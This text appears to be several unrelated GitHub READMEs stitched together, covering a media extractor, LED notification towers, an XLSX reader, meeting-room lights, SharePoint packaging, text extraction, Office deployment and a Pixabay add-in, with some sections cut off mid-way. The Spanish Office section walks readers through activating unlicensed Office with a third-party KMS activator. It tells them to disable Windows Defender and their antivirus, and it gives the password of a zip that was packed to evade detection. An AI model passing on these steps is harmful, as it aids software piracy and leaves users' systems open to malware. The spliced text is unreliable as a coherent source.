If you are interested in translating the application, please [open a new Issue](https://github.com/rabanti-github/Media-Extractor/issues/new) with the tag '**translation**'. The defined terms that are to be translated can be found in [this wiki Article](https://github.com/rabanti-github/Media-Extractor/wiki/Translation-Template). Alternatively, the default translation terms can be downloaded as [Excel file](./resources/translation/DefaultTranslationStrings.xlsx). This is a direct copy of the default [Resources.resx file](https://github.com/rabanti-github/Media-Extractor/blob/master/MediaExtractor/Properties/Resources.resx).

Please do not hesitate to ask, if the context of a term is not clear.

## SmartScreen Warning in Windows 8.1, 10 and 11

Windows 8.1 introduced a mechanism to protect users from phishing websites and malware, yet not known to Antivirus programs. This mechanism is called [SmartScreen](https://support.microsoft.com/en-us/help/17443/microsoft-edge-smartscreen-faq) and either blocks the access to a malicious website, or the execution of unknown apps.
Unfortunately, it is possible that Media-Extractor is initially blocked by SmartScreen, since the mechanism do not know the app until 'some people' have downloaded and executed the app. The number of necessary downloads until the app is not seen as unknown (thus, not blocked by SmartScreen anymore) is not that clear.
The second unfortunately fact is that SmartScreen will be triggered by each new version of the app.
What you can do to execute Media-Extractor:

- Tell SmartScreen that you trust the app (must only declared once)
- Disable SmartScreen according to [this article](https://support.microsoft.com/en-us/help/17443/microsoft-edge-smartscreen-faq)
- Wait until enough people have downloaded and executed Media-Extractor

Note: Similar mechanisms may be also triggered by Browsers, like Edge, Chrome or Vivaldi

## Development Dependencies

The following libraries / dependencies are necessary for the development of Media-Extractor. All of them are maintained by NuGet:

- [SevenZipExtractor](https://github.com/adoconnection/SevenZipExtractor)
- [Ookii.Dialogs.Wpf](https://github.com/ookii-dialogs/ookii-dialogs-wpf)
- [AdonisUI](https://github.com/benruehl/adonis-ui/) and AdonisUI.ClassicTheme
- [NanoXLSX](https://github.com/rabanti-github/NanoXLSX) (for TranslationHelper project)
- [Mono.Options](https://github.com/xamarin/XamarinComponents/tree/main/XPlat/Mono.Options) (for TranslationHelper project)

## Additional Development Projects

- TranslationHelper (import/export utility, used for the translation of Media-Extractor)
- InstallerBootstrap (utility to post-build the installer script after building Media-Extractor)
- MediaExtractorInstaller ([Inno Setup](https://jrsoftware.org/isinfo.php) project to create the installer file)

# formerly mini-notification-tower

I've recently found good sellers for lower cost industrial towers, while I'll still 3d print my own 180 degree tower light and share files should someone want to build one, I've now designed a semi-universal controller for controlling analog 12-24v tower lights

New code can be found here: [Github](https://github.com/austinscreations/OXRS-AC-TowerController-ESP8266-FW) <br>
Load up a bin file in wifi or ethernet mode and provision the device using the admin UI: [Github](https://github.com/OXRS-IO/OXRS-IO-AdminUI-WEB-APP) <br>
Compatable with the (http://oxrs.io) system

As someone who has a home office and a workshop in the garage I wanted an easy way to have notifications whereever I am.
traditional 5 layer led notification lights are large and pricey.
I set out to make a smaller alternative solution. with 3d printing I made a 180 degree light, with the help of a 3d printed mold I was able to use epoxy resin and tints to create the lenses.

-

Red - flashing - immediate issue (such as a fire alarm or CO alarm)

Red - machine error (cnc or 3d printer)

Yellow - flashing - machine error / require attention (such as a 3d printer filament sensor or 3d print ends)

Yellow - equipement On - temperature related (3d printer active (hot end or heat bed) or soldering iron on)

Green - equipment on but idle (say 3d printer or soldering iron is on but not running a job

Blue - notifications (with the help of an I2C lcd I'm able to show messages

White - tied to my doorbell (one to my office door and front house door)

-

Version 1 used 5mm leds in a 3d printed insert - mosfets controlelr wired to 5v and arduino nano. the arduino nano was linked to an rf433 reciever for the doorbell.


Version 2 will include a PCB for a Wemos d1 mini and SMD leds, and I want to try to make a 360 degree model as well.
          
RF433 will be offloaded to a esp-01 to build a seprate gateway for my home assitant installation.

# XLSX-Reader (100% Scala Excel files reader)

Just a pure Scala XLSX reader for the famous office suite spreadsheets generator. 
It's aimed at parsing of XLSX file without any other libraries. No Apache POI dependencies has been used for this project.
The business logic is fast and lightweight; with useful API to access the data and the smallest possible amount of datastructures. The functional approach with some container entities avoid the cumbersome boilerplate of the others object oriented based libraries. 
The use of shared states is reduced at the minimum and under the hood the parsing is based on a SAX parser on zipstreams readen directly from the internal files. This architecture reduce the memory occupation and is very fast; especially compared to the old DOM based ones.
Row is the main abstraction that map the row into the sheet with just the semantic content after a sanitization and ad hoc transformation phase.

Base features:

- Read directly from zipstreams
- Parsing all major excel datatypes
- Parsing cells with metadata (ex.: currency meta)
- It can't manage formulas and excel errors
- Range rows reading
- Dates are normalized from 01-01-1970

Simple use, just create the parser instance and read the target sheet:

```
  val path = ""/your/path/to/file.xlsx""
  val sheet = ""Sheet_1""
  val fromRow = 0
  val toRow = 5
  val parser = new XLSXParser
  val result: List[Row] = parser.readSheet(path, sheet, fromRow, toRow)
```

Allow to use any old style light switch for home automation systems based on Arduino IDE

This software ""hacks"" a regular light power switch for automation.
  
When the system starts the relay is set to OFF, no mater in what position the light switch is. Maybe it was left ON when a power surge happened.
   
At the first change on this power switch, lights will be powered ON, even if the switch goes to the OPEN position.
   
This allows, among other things, to use regular light switches on home automation systems, avoiding the need to change the switch to some kind of use mommentary push key.
   
As it is now integrated to an automation system, you can also use it as a parallel light switch, using several switches in different areas of a room to turn ON or OFF some especific light.
   
The touch and feel is the same as the old fashion light switches, with all the bennefits that computerized home automation can offer.

Lógica para ""enganar"" interruptor comum e fazer com que ele seja um acionador de automação de iluminação.
   
Quando o sistema inicia, os relês ficam DESLIGADOS, não importa a posição em que o interruptor esteja (On ou OFF).
   
Ao primeiro acionamento, (de ON para OFF ou de OFF para ON) o sistema aciona o relê a que este interruptor esteja ligado.
   
Isto permite, entre outras coisas, o acionamento de uma luminária em ""paralelo"". É um emulador.
   
Além disso, pertite todas as funcções que eua automação tradicional permite.
  
Evita a necessidade de trocar os interruptores tradicionais por pulsadores.

An Outlook Add-In to clean up duplicated Outlook recipients.

## Features
Ever wondered how to remove duplicated participants out of your conversation in Outlook? Especially for big conversations this really can be a pain.
What sounds like a must have out of the box Outlook feature simply was not payed attention by the Microsoft developers.
Although there are some *dirty* workarounds like copying the recipients to Excel to remove the duplicates or payed Add-Ins, this seems not to be really satisfying.

This Add-In comes up with the solution: It removes all duplicated recipients of the *To*, *CC* and *BCC* fields by their address to leave only unique entries.

## Latest changes
You can find the latest and all other changes in the [changelog](CHANGELOG.md).

## Installation
Download a [release version](https://github.com/Fruchtzwerg94/OutlookRecipientCleaner/releases) and install it by executing the *setup.exe*. Restart Outlook and you are ready to go.

In case you want to uninstall the plugin, navigate to Windows *Settings* --> *Apps* --> *Apps & features* and remove *OutlookRecipientCleaner*.

Note that you can manage Outlook Add-Ins by navigating to *File* --> *Options* --> *Add-Ins*. For more details see Microsofts documentation on how to [view, manage, and install add-ins in Office programs](https://support.microsoft.com/en-us/office/view-manage-and-install-add-ins-in-office-programs-16278816-1948-4028-91e5-76dca5380f8d).

### Compatibility
This Add-In requires at least *Outlook 2013*, it was developed and tested with *Outlook 365 (Version 2202) 32 Bit*.

## Usage
The Add-In will show up in Outlooks Ribbon Bar tab *Add-Ins*. Clicking the *Clean* (<img src=""OutlookRecipientCleaner/OutlookRecipientCleaner/Resources/Clean.png"" width=""25"">) button does all the magic.
It removes all duplicated recipients by their address. Recipients of the *To* field are priorized over recipients of the *CC* and *BCC* fields.

## Personal Note
*I've created this software in my leasure time since I found no comparable solution to clean recipients seamlessly in Outlook.

# **G**ently **T**ell **F**olks **O**ut (of meeting rooms)

Push reservation notifications to meeting rooms!

Using remote modules equipped with RGB LEDs,
GTFO lets meeting room occupants know the status of their current reservation.
For example, 5 minutes before a meeting ends and another is set to begin,
the room's LED will light up orange to let occupants know it's time to begin wrapping up.

# Getting started

## Minimum requirements

#### Room notification lights

The hardware setup consists of a **host server** and _n_ number of **remote modules**.

A Unix-based system is required to run the host server which will control each remote module.
A Raspberry Pi is recommended for its small footprint and power consumption,
but a spare computer running OSX or Linux can be used just as well.

A network with 802.11b/g/n WiFi hotspots is required for the remote modules to connect to. Particle Photons are headless devices,
so note that the hotspot security must _not_ require a browser-based login portal for authenticating.
(Router passwords, however, can be entered through Particle's terminal setup application.)
MAC address white-listing can also be used for additional security.

The host server must be on the same LAN as the remote modules.

### Office map

The host server will serve a map of the office on `http://[host-ip-or-name]:3000`,
with programmatically-generate tiles for each remote module declared in `environment/devices.json`.

For this map to be usable, you must provide your own background image(s) and the size and position of each room tile.
See [environment configuration documentation](./documentation/environment.md).

Minimum required hardware **per each remote module**:

- [Particle Photon](https://store.particle.io/)
- NeoPixel (or equivalent WS2812 LEDs)

## Hardware Setup

[![Photograph of hardware wiring](./documentation/schematic.png)](./documentation/schematic.fzz)

#### Photon Boards

Photon boards communicate with the Particle cloud and receive updates through the [Particle API for JS](https://www.npmjs.com/package/particle-api-js).

[Connect each board](https://docs.particle.io/guide/getting-started/start/photon/) to your WiFi network.

Flash each module with `firmware/firmware.cpp`.
(`npm run flash` is a WIP script to flash every device listed in `devices.json`.)

Retrieve the access tokens and device ids for each Photon, and place them into `environment/devices.json`.
See [environment configuration documentation](./documentation/environment.md).

Wire a set of NeoPixels to each Photon board. Optionally, wire a motion and temperature sensor.

Note that the firmware is configured to run with 12 NeoPixels. I recommend [this](https://www.adafruit.com/product/1643) ring for the best effects, but other NeoPixel configurations can be used. Just be sure to update `PIXEL_COUNT` in firmware.cpp to the correct number of pixels.

###### LED pin configuration (required)

###### Motion sensor pin configuration (optional, must be enabled in [environment configuration](./documentation/environment.md))

Motion sensors enable detecting presence of room occupants in unreserved rooms,
and setting the room status to ""squatted"" on the office map.
Hardware: [HC-SR501](http://www.instructables.com/id/PIR-Motion-Sensor-Tutorial/)

| Wire |  Pin   |

| GND  | Ground |

## Software Setup

```bash
git clone https://github.com/Nase00/gtfo.git && cd gtfo && npm install
```

Before the application can be run, [read how to configure it to your specific office](./documentation/environment.md) or run `npm run demo` to generate an example configuration. The application will not run otherwise.

```
# After environment files have been configured
npm run hot --mocks
```

This will start the application in development mode with [mock data](./documentation/mocks.md) and [hot-reloading](https://github.com/gaearon/react-transform-boilerplate). At this point, the application should find and connect to each Particle Photon, and light up the LEDs.

# Gateway API

GTFO does not currently handle authentication, thus it does not query Outlook Web Acess, Exchange Web Services, or any other services containing reservation data directly. Instead, a ""gateway"" API must be used as middleware when running production mode or development mode with live data. (E.g., running `yarn hot` with the `--mocks` flag.)

GTFO was developed in tandem with [ews-wrapper](https://github.com/rishirajsingh90/ews-wrapper), but any service could be used in its place, so long as the output is an identical format.

### Sample gateway API output consumed by GTFO

```json
[
  {
    ""name"": ""SomeRoom"",
    ""schedule"": [
      {
        ""subject"": ""Alice Murphy"",
        ""start"": {
          dateTime: ""2018-11-30T15:00:00.000Z""
        },
        ""end"": {
          ""dateTime"": ""2018-11-30T15:30:00.000Z""
        }
      },
      {
        ""subject"": ""Anders Holmvik"",
        ""start"": {
          dateTime: ""2018-11-30T16:00:00.000Z""
        },
        ""end"": {
          ""dateTime"": ""2018-11-30T17:00:00.000Z""
        }
      },
      {
        ""subject"": ""Alice Murphy"",
        ""start"": {
          dateTime: ""2018-11-30T17:00:00.000Z""
        },
        ""end"": {
          ""dateTime"": ""2018-11-30T18:00:00.000Z""
        }
      }
  },
  {
  ""name"": ""SomeOtherRoom"",
  ""schedule"": [
    {
      ""subject"": ""Jillian Belk"",
      ""start"": {
        dateTime: ""2018-11-30T15:00:00.000Z""
      },
      ""end"": {
        ""dateTime"": ""2018-11-30T16:30:00.000Z""
      }
    }
  }
]
```

In production mode, it assumed the gateway API is deployed on another domain, defined in `environment/config.json`.
See [environment configuration documentation](./documentation/environment.md).

##### Production build and deploy

```bash
npm install --production # Several dev dependencies are not Raspberry Pi compatible.
npm run prod # Production mode with live data. ews-wrapper or an equivalent service must be deployed and defined in environment/config.json!
```

### Ping API

_[Alexa](https://developer.amazon.com/public/solutions/alexa), where is Kerbin?_

_Kerbin is on the east side of the office. I've highlighted it on map for you._

The Ping API allows external services to ""ping"" specific rooms on targetted clients. Clients can be targetted using ""anchors.""
The anchor id used is completely arbitrary, but must be matched between the service making the ping and the client attempting to be pinged.

To anchor a client, simply add an `anchor` query paramter to its route. E.g., `http://hostname:3000/sears-tower-251?anchor=east-lobby` defines the client's anchor as `east-lobby`.

To ping this client from an external service, direct a POST request to `http://hostname:3000/api/ping` with the headers:

```js
{
  ""id"": ""foo"", // Required only when using a proxy (see blow), must match the application ID set in config.json
  ""targetId"": ""kerbin"",
  ""anchor"": ""east-lobby"",
  ""event"": ""NEW_ROOM_PING""
}
```

The result of this ping is that Kerbin lights up on the client anchored to the east lobby. An example use of this is anchoring a client on a display in the east lobby, and assigning a nearby Amazon Echo to highlight queried rooms on the TV.

#### Ping troubleshooting

Some internal office networks restrict exposing ports for making HTTP requests. This would make it impossible, for instance, for an Echo lamdba service hosted on AWS to send a ping request to a GTFO server hosted on the office intranet. For these restricted networks, _[Acheron](https://github.com/Nase00/acheron)_ was created to be hosted externally (e.g., on a cloud service) to accept and forward pings to GTFO via a WebSocket connection.

To avoid confusion, note that there are two distinct WebSocket services within GTFO. The [socket controller]('server/controllers/socket') exists to _host_ a WebSocket server to which browser applications connect to as _clients_. The [proxy controller]('server/controllers/proxy') controller exists to connect to the proxy _host_ where GTFO itself is considered the sole _client_.

## Development

##### Development mode with hot-module reloading

```bash
npm run hot
```

##### Tests

```bash
npm run test # Lints and tests client, server, and universal code.
```

##### CLI Options

```bash
# pipe flags with ""--"", e.g. ""npm run hot -- --mocks --dhc""
--mocks # Disables Outlook api in favor of using mock reservation data.
--dhc # Disables consoleController's fancy terminal output, sometimes needed for debugging.
--dd # Disables devices, useful for client testing without room module hardware.
```

# Troubleshooting

> Meeting room reservations aren't accurate

Make sure your server's system timezone is set correctly. Reservation times are compared against the system time to determine room reservation statuses. Raspberry Pi defaults to GMT+0.

Edit existing Word documents effortlessly and without changing the original formatting of the document. 

As great as the original `docx` library is, this ""keep same format"" feature is not natively supported. However, this functionality is pretty useful if you want to automate document writing or editing and need to adhere to strict formatting rules. Hence, I wrote this small add-on module.

[![PyPI version](https://badge.fury.io/py/docxedit.svg)](https://badge.fury.io/py/docxedit)

## Installing

With pip: `pip install docxedit`

## Dependencies

Included as a dependency: `python-docx`

## Functions

Most of the functions in this module work primarily with **runs**, which are sequences of strings with the same formatting style.
This is how we can edit the document but keep the original format.

# Example Usage

```python
from docx import Document
import docxedit

document = Document()

# Replace all instances of the word 'Hello' in the document by 'Goodbye'
docxedit.replace_string(document, old_string='Hello', new_string='Goodbye')

# Replace all instances of the word 'Hello' in the document by 'Goodbye' but only
# up to paragraph 10
docxedit.replace_string_up_to_paragraph(document, old_string='Hello', new_string='Goodbye', 
                                        paragraph_number=10)

# Remove any line that contains the word 'Hello' along with the next 5 lines

    - to check if it is currently running, replace `start` with `status`
        - replace `start` with `restart` if it is already running
2. Start MongoDB: Run `systemctl start mongodb` (may be `mongod` depending on your version)
    - use `status` and `restart` to check if it is currently running
3. In the project's main directory, run `source venv/bin/activate` (if not already in a virual enviroment) and then run `python3 main.py`
    - The client will be served at http://localhost:5000

SubPointSolutions,MetaPack,SubPointSolutions,https://github.com/SubPointSolutions/MetaPack,https://api.github.com/repos/MetaPack/SubPointSolutions,"A NuGet platform for packaging, delivering and deploying SharePoint customization with PnP/SPMeta2 support.","# MetaPack
MetaPack is a platform for packaging, delivering and deploying SharePoint customization. MetaPack abstracts away packaging, versioning, dependency management, deploying and updating pipelines offering a complete and consistent workflow instead.

See it that way: there are many ways to build and deliver SharePoint solutions - from using old fashioned *.wsp packages, custom PowerShell scripts, to modern remote provisioning approaches using SharePoint PnP or SPMeta2 libraries. But building actual ""installation package"" takes effort, a fair share of a pluming code while the actual outcome, such as a console application or PowerShell script, is highly inconsistent, hard to scale and support.

That is where MetaPack comes! It offers a common, standardized and extensible platform for packaging, delivering and deploying SharePoint solutions regardless of the actual framework or provisioning library used.

### Build status
| Branch  | Status |
| ------------- | ------------- |
| dev   | [![Build status](https://ci.appveyor.com/api/projects/status/1weq7g33dfp3xi6i/branch/dev?svg=true)](https://ci.appveyor.com/project/SubPointSupport/metapack/branch/dev)  |

## How does MetaPack work?
MetaPack is built on top of NuGet platform so that it leverages all NuGet features and concepts: from packaging, versioning, dependency management to NuGet Galleries. First of all, MetaPack API can create a NuGet package out of SharePoint customizations. Next, once target NuGet package is published to NuGet Gallery or local file system, MetaPack API can deploy target NuGet package straight to SharePoint. No more *.wsp, console apps or PowerShell scripts - all customizations is a NuGet package!

MetaPack integrates with the most popular provisioning libraries for SharePoint: SharePointPnP and SPMeta2. Regardless of the library you use, MetaPack creates a NuGet package out of SPMeta2 or PnP solutions. That said, taking care of packaging, versioning and dependencies, MetaPack delegates actual provision of a package to SPMeta2 or SharePointPnP.

Here is how it works for both SharePointPnP and SPMeta2: 
![MetaPack Vision](https://subpointsolutions-dev.netlify.com/content/img/products/metapack/metapack-vision.png)

## Key features of MetaPack
Below are some of the key features of MetaPack and even more scenarios on how MetaPack can be used:

* **Standardized solution packaging**: MetaPack abstracts away packaging of your SharePoint customizations. You don't have to think about how to package and deliver your SharePoint customization - you always have a NuGet package as a smallest ""module""
* **Standardized versioning**: version your SharePoint customizations same way as you version you APIs: use semantic versioning across the board, use NuGet packages and NuGet Galleries
* **Dependency management**: modularize your SharePoint customizations in the most natural, industry-adopted way - using NuGet versioning and its dependency management. MetaPack understands dependencies: it resolves and deploys required packages same way as NuGet does
* **Extensible API**: MetaPack provides extensible API so that it is possible to implement a custom packaging and deployment workflows. For instance, you can implement your own licensing asking people a license key before deploying SharePoint customizations with MetaPack.
* **MetaPack CLI**: built for developers, MetaPack also offers a command-line interface for both developers and IT professionals. That enables easy integration of MetaPack with existing CI/CD pipelines as well as IT professionals can deploy SharePoint solutions with a single line command
* **MetaPack GUI** (coming soon): we would like to enable business users and IT professionals with a friendly GUI application to manage and deploy SharePoint customization. It is work in progress but let us know what you think of it

## How MetaPack can be used?
Standardized packages, versioning and dependency management coupled with out of the box support for SharePointPnP/SPMeta2 and extensible API makes other interesting scenarios possible:

* **A global, community-driven solution catalog** -  why not to create a public NuGet gallery devoted to open-source, community-driving SharePoint solutions? Let us know if you want one!
* **A private, corporate solution catalog** - why not deploy NuGet gallery internally in your company and deliver your solutions for SharePoint that way?
* **A private solution catalog for your customers** -  are you a SharePoint consultancy? Why not deploy a private NuGet gallery to deliver solutions for your customers? You can use http://myget.org to get one as cheap as $7 a month
* **You own packaging and licensing** - are you an ISV company? Why not implement your own packaging provider asking people for a commercial license key before actually deploying your solution?
* **API-independent solutions provision orchestrations** - why not to mix few SharePointPnP and SPMeta2 solutions in a single batch? MetaPack takes care of all details so that we can focus on WHAT to deploy rather HOW to deploy

This gem wraps command line tools to extract plain text from typical files such as

- PDF
- RTF
- MS Office
    - Word (doc, docx)
    - Excel (xsl, xslx)
    - PowerPoint (ppt, pptx)
- OpenOffice + Libre
    - Presentation
    - Text
    - Spreadsheet
- Image files (png, jpeg, tiff), such as screenshots and scanned documents, through character recognition (OCR)
- Plaintext (txt)
- Comma-separated values (csv)

## Acknowledgements

This gem bases on work by Jens Krämer / Planio, who originally provided it as a
[patch for Redmine](https://www.redmine.org/issues/306). Now, it is a collaborative effort of
both project management software providers [Planio](https://plan.io) and [OpenProject](https://openproject.org)
as both systems tackle the identical challenge to extract plain text from attachment files.

## Installation

Add this line to your application's Gemfile:

```ruby
gem 'plaintext'
```

And then execute:

    $ bundle

Or install it yourself as:

    $ gem install plaintext

#### Rails

In a Rails application save `plaintext.yml.example` in `config/plaintext.yml` and overwrite the settings to 
your needs.

Then load that configuration file in an initializer. Add the following lines to `config/initializers/plaintext.rb`:

```ruby
path = Rails.root.join 'config', 'plaintext.yml'
if File.file?(path)
  config = File.read(path)
  Plaintext::Configuration.load(config)
end
````

#### Plain Ruby

Please overwrite `Plaintext::Configuration.load`.

### Linux

On linux the default configuration should work. However, make sure that the following packages are installed

    $ apt-get install catdoc unrtf poppler-utils tesseract-ocr

### Mac OS X

On Mac things are still not complete. Please help us to have the same capabilities as under Linux. Right now we cannot
extract text from presentation and spreadsheets.

Please use homebrew to install the missing command line tools.

    $ brew install unrtf poppler tesseract
    
The `plaintext.yml` should look like this:
    
```yml
pdftotext:
  - /usr/local/bin/pdftotext
  - -enc
  - UTF-8
  - __FILE__
  - '-'

unrtf:
  - /usr/local/bin/unrtf
  - --text
  - __FILE__

tesseract:
  - /usr/local/bin/tesseract
  - __FILE__
  - stdout

catdoc:
  - /usr/bin/textutil
  - -convert
  - txt
  - -stdout
  - __FILE__
```

## Usage

```ruby
# `file` is of type File.
# `content_type` is a String.
fulltext = Plaintext::Resolver.new(file, content_type).text
```

To limit the number of bytes returned (default is 4MB), set the
`max_plaintext_bytes` property on the resolver instance before calling `text`.

# Instalación Automatizada de Office

##### * (Si usted únicamente quiere realizar la instalación salte hasta el punto *""3) ¿Cómo comenzar la instalación automatizada?""*)

La mayor parte de las aplicaciones instalables en windows se pueden configurar a través de archivos `.xml`. Por lo anterior, es posible correr el archivo de instalación de office `setup.exe` y darle como parámetro el `archivo_de_configuracion.xml` para lograr una instalación automatizada.

## Contenido de la carpeta deploy_office

Todo lo necesario para lanzar la instalación de office de una manera automatizada, se encuentra dentro de la carpeta `deploy_office`. 

Dentro de ella los siguientes archivos:
+ `config_sample.xml` (Archivo ejemplo de configuración)
+ `EULA`  (Los términos de licencia)
+ `setup.exe` Exe que se encarga de realizar la instalación. (Office Deployment Tool)
+ `configuration_*.xml` (Archivos de configuracion de cada version en especifico)
	+ Office365_x64
	+ Office365_x86
	+ Office Enterprise
	+ Office 2016 Pro Plus
+ `install_config.cmd` (Archivo que lanza la instalación)
	+ Office365_x64
	+ Office365_x86
	+ Office Enterprise
	+ Office 2016 Pro Plus

## 1) ¿Cómo se configura el archivo .xml?
Nosotros ya contamos diversos archivos de configuración `.xml` por defecto. Sin embargo, estos pueden ser modificados para que se acoplen completamente a nuestras necesidades. Para ello a continuación explicaremos las partes del archivo `config_sample.xml`

```xml
<Configuration>

  <Add OfficeClientEdition=""64"" Channel=""Monthly"">
    <Product ID=""O365ProPlusRetail"">
      <Language ID=""es-es"" />
      <ExcludeApp ID=""Access"" />
      <ExcludeApp ID=""InfoPath"" />
      <ExcludeApp ID=""Lync"" />
      <ExcludeApp ID=""SharePointDesigner"" />
      <ExcludeApp ID=""Visio"" />
      <ExcludeApp ID=""Skype"" />
      <ExcludeApp ID=""Skypeforbusiness"" />
      <ExcludeApp ID=""Groove"" />
    </Product>
    <Product ID=""VisioProRetail"">
      <Language ID=""es-es"" />
    </Product>
  </Add>
</Configuration>
```

Como podemos observar el archivo de configuración únicamente consta de un par de etiquetas en las que destacan:
+ Add OfficeClientEdition
	+ Aquí podemos elegir los valores `32` o `64` dependiendo si queremos hacer la instalación de 32bits o 64bits
+ Product ID
	+ Aquí podemos seleccionar el producto a instalar
		+ `O365ProPlusRetail` (Office 365 ProPlus)
		+ `ProPlusRetail` (Office 2016 ProPlus)
	+ Language ID
		+ `en-us`
		+ `es-es`
		+ <a href=""https://docs.microsoft.com/en-us/deployoffice/overview-deploying-languages-microsoft-365-apps"" target=_blank>Puede ver todos los códigos de lenguajes aquí</a>
	+ ExcludeApp ID
		+ Aplicaciones a excluir. No serán instaladas
	+ Product ID
		+ Aplicaciones extras que se incluirán

## 2) ¿Cómo se configura el archivo .cmd?
Ya que nuestro `setup.exe` depende de un archivo de configuración, este debe correrse a través de la consola, ya sea mediante `cmd` ó `powershell`.
Para facilitar esto nosotros podemos crear un archivo `install_config.cmd`.
* Nuevamente, nosotros ya tenemos un par de archivos preconfigurados
	+ 

¿Qué hay dentro de este archivo?

```bat
@echo off
cd /d %~dp0
setup.exe /configure config_sample.xml
pause
```

Básicamente este pequeño script lo que realiza es: 
1. Llamar a `setup.exe` 
2. Dar la bandera `/configure` que indica que le darás un archivo de configuración 
3. Indicar el nombre del archivo de configuración `install_config.cmd`

Si lo queremos modificar solamente cambiamos el punto *""número 3""* especificando el nombre del archivo de configuración que se tendrá.
* Si creamos un archivo desde cero, hay que recordar guardarlo con extensión *.bat* o *.cmd*

## 3) ¿Cómo comenzar la instalación automatizada?

Para comenzar una instalación automatizada únicamente debemos dirigirnos hacia la carpeta `deploy_office` y hacer doble click en el `install_config.cmd` deseado.
+ Como vimos anteriormente contamos con distintas configuraciones dependiendo de nuestras necesidades
	+ Office365_x64
	+ Office365_x64
	+ Una customizada, en caso de que la haya creado
+ Si tiene algún problema durante este proceso consulte la sección de ""Problemas / Soluciones""

Una vez ejecutado nuestro `install` aparecerá la tipica pantalla de instalación de Office y tras varios minutos se habrá completado la instalación. El tiempo que tarde dependerá principalmente de su velocidad de descarga de internet. 

Una vez que eso haya finalizado tendremos disponible nuestro Office sin licencia.

# ¿Validación de licencia? ¿Crack de Office?

Es posible validar la licencia mediante un simple script. Esto ocurre gracias al Servicio de Administración de Claves KMS (Key Management Service). Este es un servicio legitimo de Windows y está diseñado para que las organizaciones activen sus productos por volumen. 

Es decir, la organización contrata un montón de licencias que serán utilizadas por toda su empresa, a diferencia del licenciamiento estándar de Microsoft, estas no se anclan a una máquina en especifico, sino a la cuenta de una empresa. Por lo anterior, para este tipo de activación se debe contemplar lo siguiente:

1. La empresa debe montar su propio servidor KMS.
2. Requieren un mínimo de activaciones para funcionar. Es decir, para hacer válidas las activaciones varia el número MÍNIMO de clientes que utilicen la licencia. De otro modo está sería inválida.
3. El office solamente se activa de manera temporal, durante 180 días, y su licencia debe ser renovada antes de que termine el plazo.

Para las organizaciones lo anterior no representa problema alguno, pues suelen cumplir con estos requerimientos. Sin embargo, este mismo modelo de negocio es el que permite se pueda *""engañar""* a Windows para hacerle creer que está bajo un licenciamiento por volumen.

Debido a que cualquier persona puede generar su propio servidor KMS este puede ser modificarlo para que se apruebe cada licencia. Para esto solamente se requiere lo siguiente:

1. Montar tu propio servidor KMS
2. Hacer que tus computadoras consulten al TU SERVIDOR KMS
3. Hacer que cada determinado tiempo se renueve la licencia mediante tu propio servidor KMS

Para esto ya existe un script proporcionado por [https://msguides.com/](https://msguides.com/) el cual se conecta con su propio Servidor KMS.

# ¿Es seguro utilizar activadores KMS?
Como vimos anteriormente el problema no es usar activadores KMS, pues estos son proporcionados por Microsoft a las empresas que pagan licenciamiento por volumen. El verdadero problema es llegar a la pirateria de estos servicios, pues es ahí donde nos podemos encontrar con software malicioso.

Sin embargo, el script activador que proporciona [msguides](https://msguides.com/) parece bastante transpartente. El código con comentarios del activador KMS se encuentra en la sección **Anexo Script con comentarios**.

## ¿Cómo utilizar este script?

Para utilizar este script es necesario descomprimir el archivo `activate.zip`. Este archivo está protegido por contraseña porque de otro modo Windows Defender lo detecta como amenaza al descargarlo. 

+ Asegúrese de que Windows Defender esté desactivado. (Consultar la sección: ""*¿Cómo apagar Windows Defender?""*)
+ El password es el siguiente:

##### Password: `activate`

Una vez descomprimido el archivo solamente tenemos que dirigirnos a la carpeta `activate` y *ejecutar como administrador* el archivo `activate.cmd`
1. Click derecho, ejecutar como administrador
1. Nos abrirá una consola 
1. Presionaremos enter una vez. Esto tardará un poco, en caso de ser necesario presionaremos enter de nuevo.
1. Debe aparecernos: `<Product activation successful>`
	+ De no ser así es probable que no haya corrido el script con privilegios de administrador
1. Luego de ello nos preguntará si queremos visitar el blog del autor de este script
	+ responderemos `y` ó `n`
	+ Justo después de elegir nuestra respuesta se cerrará la ventana
1. Y así habremos comprobado que efectivamente el office ha quedado activado

#### Dato curioso: Tu office se transforma a Office 2016 Pro Plus.

# Problemas / Soluciones
+ Windows detecta activate como virus
	+ Lo que sucede es que windows detecta el script como un activador de Office y por supuesto lo bloquea. De hecho, en la descripción de Windows Defender menciona.
		+ HackTool:BAT/AutoKMS
		+ This program has potentially unwanted behavior
	+ Y claro, ellos no desean que tú tengas sus productos sin pagar por ellos
	+ Basta con deshabilitar Windows Defender durante la activación.
	+ Si el problema persiste desactiva tu antivirus 
+ Pantalla azul de bloqueo
	+ Al igual que `Windows Defender - Real Time Protection` es necesario desactivar `App & Browser Control - Check apps and files` como se menciona en la sección de `¿Cómo apagar Windows Defender?`
+ ¡No sé la contraseña del zip!
	+ Bro, ese no es un problema. La contraseña es `activate` como se mencionó en el post.

Using this add-in you can search free (Creative Commons CC0 licensed) images on Pixabay right inside Word or PowerPoint – and insert them with one click.,"# Pixabay Images for Microsoft Word & PowerPoint

Using this add-in you can search free (Creative Commons CC0 licensed) images on [Pixabay](https://pixabay.com) right inside Word or PowerPoint – and insert them with one click.

![Pixabay Images Screenshot inside PowerPoint](readme-img/screenshot-powerpoint.jpg)

![Pixabay Images Screenshot inside Word](readme-img/screenshot-word.jpg)

## Installation

### Directly from the Office Store

1. Open a new document in Word or PowerPoint
2. On the _Insert_ tab, click _Office Add-ins_
3. Click _Store_, and just search for Pixabay
4. Click the _Add_ button next to _Pixabay images_

Alternatively, you can get it from [https://appsource.microsoft.com/en-us/product/office/WA104381335?tab=Overview](https://appsource.microsoft.com/en-us/product/office/WA104381335?tab=Overview)

### Sideloading

If you want to load a development version of the add-in, you will need to sideload it. It only takes a few minutes to complete these steps.

You can use the add-in with Office Online, or with the desktop apps on Windows or macOS, or even with iPad.

#### Office Online

1. Download the manifest file [uppp-vs.xml](https://raw.githubusercontent.com/madve2/uppp-pixabay-for-office/master/uppp-vs.xml)
2. Open Word Online or PowerPoint Online. (E.g. open a Word or PowerPoint document on OneDrive in the browser.)
3. On the Insert tab of the Ribbon, click *Office Add-ins*
4. Click *Upload My Add-in* in the upper-right corner
5. Select the manifest file you downloaded, click Upload

From now on, the Pixabay Images add-in will be available on the Insert tab, anytime you need it.

![The Pixabay Images icon as seen on the Ribbon](readme-img/ribbon-button.png)

#### Windows

The add-in is actually available online, you just need to download the _manifest file_ (see below) and put it in a place where Word / PowerPoint expects to find it. This _has to be_ a network share, even if you install it just for yourself – but don't worry, it's very easy to create one.

